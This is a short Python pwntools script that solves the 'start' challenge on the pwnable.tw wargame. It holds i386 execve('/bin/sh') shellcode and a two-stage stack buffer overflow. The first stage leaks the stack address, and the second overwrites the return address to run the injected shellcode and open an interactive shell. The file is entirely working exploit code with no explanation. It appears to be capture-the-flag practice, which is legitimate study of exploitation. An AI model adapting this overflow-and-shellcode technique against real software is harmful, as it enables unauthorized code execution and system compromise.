# coding: utf-8
from pwn import *

# Set target environment
context(os='linux', arch='i386')

HOST = 'chall.pwnable.tw'
PORT = 10000

# mov ecx, esp
stack_leak = 0x08048087
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# for to use remote or local
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process('./start')

log.info('Pwning start')
conn.recvuntil(":")

# leak esp value
stage1 = b'A'*0x14
stage1 += p32(stack_leak)

# Save esp value
conn.send(stage1)
stack_addr = u32(conn.recv(4))
log.info("Stack Address: {}".format(hex(stack_addr)))

# Set 0x14byte character + (leaked esp + 0x14byte) + shellcode
stage2 = b'B'*0x14
stage2 += p32(stack_addr + 0x14)
stage2 += shellcode

# Get shell
conn.sendline(stage2)
conn.interactive()
